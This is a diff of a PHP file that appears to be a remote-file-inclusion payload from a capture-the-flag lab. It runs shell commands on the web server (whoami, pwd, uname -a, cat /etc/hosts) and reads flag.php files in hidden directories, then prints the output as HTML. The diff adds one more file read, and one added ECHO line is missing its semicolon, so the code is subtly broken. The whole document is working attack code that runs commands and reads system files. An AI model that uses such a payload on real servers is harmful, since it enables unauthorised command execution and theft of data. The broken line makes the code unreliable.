@@ -11,8 +11,9 @@
     $whoami_output = `whoami`;
     $pwd_output = `pwd`;
     $catetchosts_output = `cat /etc/hosts`;
-    $catflag2_output = `cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php`;
     $catflag1_output = `cat /var/www/html/rfi1/flag.php`;
+    $catflag2a_output = `cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php`;
+    $catflag2_output = `cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php`;
     $uname_a = `uname -a`;
     ECHO "--"."><p><h4> This file executes the following commands on the web server.</h4></p>";
     ECHO "<div><ol><li>Who Am I: (\"whoami\")</li>";
@@ -38,10 +39,12 @@
     ECHO "<dd><pre>" .$ls2_output ."</pre></dd>";
     ECHO "<b><dt>Contents of /etc/hosts:</dt></b>";
     ECHO "<dd><pre>".$catetchosts_output."</pre></dd>";
-    ECHO "<b><dt>Contents of /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php:</dt></b>";
-    ECHO "<dd><pre>".$catflag2_output."</pre></dd>";
     ECHO "<b><dt>Contents of /var/www/html/rfi1/flag.php:</dt></b>";
     ECHO "<dd><pre>".$catflag1_output."</pre></dd>";
+    ECHO "<b><dt>Contents of /var/www/html/rfi2/flag.php:</dt></b>";
+    ECHO "<dd><pre>".$catflag2a_output."</pre></dd>"
+    ECHO "<b><dt>Contents of /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php:</dt></b>";
+    ECHO "<dd><pre>".$catflag2_output."</pre></dd>";
     ECHO "<b><dt>uname -a:</b></dt>";
     ECHO "<dd>".$uname_a."</dd>";
 ?>
